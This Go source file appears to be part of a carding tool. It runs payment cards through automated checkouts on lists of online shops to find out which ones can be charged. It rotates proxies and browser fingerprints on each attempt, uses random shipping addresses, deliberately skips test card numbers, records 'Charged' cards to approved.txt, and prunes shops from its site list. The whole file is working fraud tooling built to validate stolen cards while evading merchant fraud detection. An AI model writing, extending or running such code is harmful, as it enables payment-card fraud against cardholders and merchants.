package main

import (
	"fmt"
	"math/rand/v2"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// ─── Result output formatting ────────────────────────────────────────────────

func statusPrefix(code string) string {
	u := strings.ToUpper(code)

	if u == "SUCCESS" {
		return "💎 Charged"
	}
	if strings.Contains(u, "ACTION_REQUIRED") || strings.Contains(u, "3D") {
		return "⚠️ Action required"
	}

	// FOR_CARD_TYPE = CVV format wrong for brand, not a real CVV mismatch
	if strings.Contains(u, "FOR_CARD_TYPE") {
		return "❌"
	}

	cvvTokens := []string{
		"INCORRECT_CVC", "INVALID_CVC", "INVALID_CVV", "CVV", "CSC",
		"PAYMENTS_CREDIT_CARD_CVV_INVALID",
		"PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID",
		"PAYMENTS_CREDIT_CARD_CSC_INVALID",
		"PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID",
	}
	for _, tok := range cvvTokens {
		if strings.Contains(u, tok) {
			return "❌ CVV mismatch"
		}
	}

	failTokens := []string{
		"CARD_DECLINED", "DECLINED", "RISKY", "GENERIC_ERROR",
		"INCORRECT_NUMBER", "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
		"FUNDING_ERROR", "PROCESSING_ERROR", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
	}
	for _, tok := range failTokens {
		if strings.Contains(u, tok) {
			return "❌"
		}
	}

	if strings.Contains(u, "MISSING_TOTAL") {
		return "❌ Checkout Failed"
	}
	return "ℹ️ Result"
}

func isTerminalFailure(code string) bool {
	u := strings.ToUpper(code)
	tokens := []string{
		"CARD_DECLINED", "DECLINED", "RISKY", "GENERIC_ERROR",
		"INCORRECT_NUMBER", "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
		"FUNDING_ERROR", "PROCESSING_ERROR", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
		"PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
	}
	for _, tok := range tokens {
		if strings.Contains(u, tok) {
			return true
		}
	}
	return false
}

func isUnknownCode(code string) bool {
	u := strings.ToUpper(strings.TrimSpace(code))
	return u == "UNKNOWN" || strings.Contains(u, `"CODE": "UNKNOWN"`)
}

func isSiteLevelError(code string) bool {
	u := strings.ToUpper(code)
	siteErrors := []string{"MISSING_TOTAL", "CAPTCHA_METADATA_MISSING", "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP"}
	for _, tok := range siteErrors {
		if strings.Contains(u, tok) {
			return true
		}
	}
	return false
}

// ─── Emit result ─────────────────────────────────────────────────────────────

var approvedFileMu sync.Mutex

func emitSummaryLine(card Card, code, amount string, elapsed float64, site string) {
	prefix := statusPrefix(code)
	line := fmt.Sprintf("%s %s  |  %s  |  %s", prefix, card.Formatted(), code, amount)

	if elapsed > 0 {
		line += fmt.Sprintf("  |   %.1fs", elapsed)
	}
	if site != "" {
		line += fmt.Sprintf("   | site : %s", site)
	}

	fmt.Println(line)

	// Append to approved.txt if charged
	if strings.HasPrefix(prefix, "💎") {
		approvedFileMu.Lock()
		defer approvedFileMu.Unlock()
		f, err := os.OpenFile("approved.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			fmt.Fprintln(f, line)
			f.Close()
		}
	}
}

func formatSiteLabel(u string) string {
	u = normalizeShopURL(u)
	host := strings.TrimPrefix(u, "https://")
	host = strings.TrimPrefix(host, "http://")
	host = strings.Split(host, "/")[0]
	parts := strings.Split(host, ".")
	label := parts[0]
	if strings.EqualFold(label, "www") && len(parts) > 1 {
		label = parts[1]
	}
	return label
}

func ordinal(n int) string {
	suffix := "th"
	switch {
	case n%100 >= 11 && n%100 <= 13:
		suffix = "th"
	case n%10 == 1:
		suffix = "st"
	case n%10 == 2:
		suffix = "nd"
	case n%10 == 3:
		suffix = "rd"
	}
	return fmt.Sprintf("%d%s", n, suffix)
}

func extractReceiptCode(resp map[string]any) string {
	if resp == nil {
		return "UNKNOWN"
	}
	receipt := navigateMap(resp, "data", "receipt")
	if receipt == nil {
		return "UNKNOWN"
	}
	t := getString(receipt, "__typename")
	switch t {
	case "ProcessedReceipt":
		return "SUCCESS"
	case "FailedReceipt":
		return extractFailureCode(receipt)
	case "ActionRequiredReceipt":
		return "ACTION_REQUIRED"
	default:
		return "UNKNOWN"
	}
}

// ─── Site removal ────────────────────────────────────────────────────────────

var siteFileMu sync.Mutex

func removeSiteFromFile(site string) {
	siteFileMu.Lock()
	defer siteFileMu.Unlock()

	data, err := os.ReadFile("working_sites.txt")
	if err != nil {
		return
	}
	lines := strings.Split(string(data), "\n")
	var filtered []string
	for _, l := range lines {
		trimmed := strings.TrimSpace(l)
		if trimmed == "" || strings.EqualFold(normalizeShopURL(trimmed), normalizeShopURL(site)) {
			continue
		}
		filtered = append(filtered, l)
	}
	os.WriteFile("working_sites.txt", []byte(strings.Join(filtered, "\n")+"\n"), 0644)
}

// ─── Single card processor ───────────────────────────────────────────────────

func processCard(idx int, card Card, sites []string, proxies *ProxyRotator, addresses []Address, productCache *ProductCache) bool {
	// Reject known test/bogus card numbers immediately
	if card.IsTestCard() {
		fmt.Printf("[TEST-CARD] %s is a known test PAN — skipping\n", card.Masked())
		return false
	}

	time.Sleep(jitter(cfg.StaggerMinMS, cfg.StaggerMaxMS))

	tried := make(map[string]bool)

	for siteAttempt := 0; siteAttempt < len(sites); siteAttempt++ {
		// Pick a random untried site
		candidates := make([]string, 0)
		for _, s := range sites {
			if !tried[s] {
				candidates = append(candidates, s)
			}
		}
		if len(candidates) == 0 {
			break
		}
		site := candidates[rand.IntN(len(candidates))]
		tried[site] = true

		shopURL := normalizeShopURL(site)
		siteLabel := formatSiteLabel(shopURL)
		masked := card.Masked()

		fmt.Println(strings.Repeat("=", 70))
		fmt.Printf("Starting %s CC (%s) on %s site: %s\n", ordinal(idx), masked, ordinal(siteAttempt+1), shopURL)

		maxAttempts := proxies.Len()
		if maxAttempts == 0 {
			maxAttempts = 1
		}
		if cfg.SingleProxyAttempt {
			maxAttempts = 1
		} else if cfg.FastMode {
			maxAttempts = min(maxAttempts, 3)
		}

		for attempt := 0; attempt < maxAttempts; attempt++ {
			startTime := time.Now()
			fmt.Printf("[INFO] %s CC, %s site -> proxy attempt %d/%d\n", ordinal(idx), ordinal(siteAttempt+1), attempt+1, maxAttempts)

			// Get proxy
			proxyURL := proxies.Next()

			// New fingerprint per attempt
			fp := randomFingerprint()

			// Create client with Chrome TLS fingerprint
			client := newClient(fp, proxyURL, cfg.HTTPTimeoutShort)

			// Check product cache
			var product *Product
			if cached, ok := productCache.Get(shopURL); ok {
				product = cached
			} else {
				product = autoDetectProduct(client, shopURL, fp, proxyURL)
				if product != nil {
					productCache.Set(shopURL, product)
				}
			}

			if product == nil {
				fmt.Println("\n❌ [ERROR] Could not find any products on this site")
				continue
			}

			fmt.Printf("\n✅ Using: %s\n", product.Title)

			// Build checkout session
			cs := &CheckoutSession{
				Client:           client,
				ProxyURL:         proxyURL,
				ShopURL:          shopURL,
				VariantID:        product.VariantID,
				AltVariantIDs:    product.AltVariantIDs,
				StorefrontToken:  product.StorefrontToken,
				GqlShopURL:       product.GqlShopURL,
				Card:             card,
				Addr:             randomAddress(addresses),
				FP:               fp,
				ShippingRequired: true,
			}

			// Step 1: Add to cart
			if err := cs.Step1AddToCart(); err != nil {
				fmt.Printf("\n[ERROR] Step 1 failed: %v\n", err)
				continue
			}

			// Step 2: Tokenize card
			if err := cs.Step2TokenizeCard(); err != nil {
				fmt.Printf("\n[ERROR] Step 2 failed: %v\n", err)
				continue
			}

			// Step 3: Proposal
			if err := cs.Step3Proposal(); err != nil {
				fmt.Printf("\n[ERROR] Step 3 failed: %v\n", err)
				continue
			}

			// Step 4: Submit
			submitResult := cs.Step4Submit()
			elapsed := time.Since(startTime).Seconds()

			if submitResult.ReceiptID == "" {
				// No receipt — emit result and decide next action
				codeDisplay := submitResult.Code
				if codeDisplay == "" {
					codeDisplay = `"code": "UNKNOWN"`
				}
				if !strings.Contains(codeDisplay, `"code"`) {
					codeDisplay = fmt.Sprintf(`"code": "%s"`, codeDisplay)
				}
				amountDisplay := formatAmount(submitResult.Total)
				emitSummaryLine(card, codeDisplay, amountDisplay, elapsed, siteLabel)

				if isTerminalFailure(codeDisplay) {
					return false // stop this card
				}
				if isSiteLevelError(submitResult.Code) {
					if cfg.SiteRemoval {
						removeSiteFromFile(shopURL)
					}
					break // try next site
				}
				if isUnknownCode(codeDisplay) {
					return false // skip card on unknown
				}
				continue // try next proxy
			}

			// Step 5: Poll receipt
			success, pollCode, pollResponse := cs.Step5PollReceipt(submitResult.ReceiptID)
			elapsed = time.Since(startTime).Seconds()

			code := pollCode
			if pollResponse != nil {
				code = extractReceiptCode(pollResponse)
			}
			amountDisplay := formatAmount(cs.ActualTotal)
			emitSummaryLine(card, code, amountDisplay, elapsed, siteLabel)

			if success {
				return true
			}

			if isTerminalFailure(code) {
				return false
			}
			if isUnknownCode(code) {
				return false
			}
			// Continue to next proxy attempt
		}
	}

	fmt.Printf("[INFO] All sites exhausted for %s CC. Moving to next CC.\n", ordinal(idx))
	return false
}

// ─── Parallel orchestrator ───────────────────────────────────────────────────

func runParallel(cards []Card, sites []string, proxies *ProxyRotator, addresses []Address) {
	productCache := NewProductCache()
	sem := make(chan struct{}, cfg.ParallelWorkers)
	var wg sync.WaitGroup

	for idx, card := range cards {
		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore slot

		go func(i int, c Card) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore slot
			defer func() {
				if r := recover(); r != nil {
					fmt.Printf("[ERROR] Worker %d panicked: %v\n", i, r)
				}
			}()

			processCard(i, c, sites, proxies, addresses, productCache)
		}(idx+1, card)

		// Stagger start
		time.Sleep(jitter(cfg.StaggerMinMS, cfg.StaggerMaxMS))
	}

	wg.Wait()
}

// ─── Remove site from working_sites.txt ──────────────────────────────────────

var reSiteStrip = regexp.MustCompile(`[^a-zA-Z0-9_-]+`)
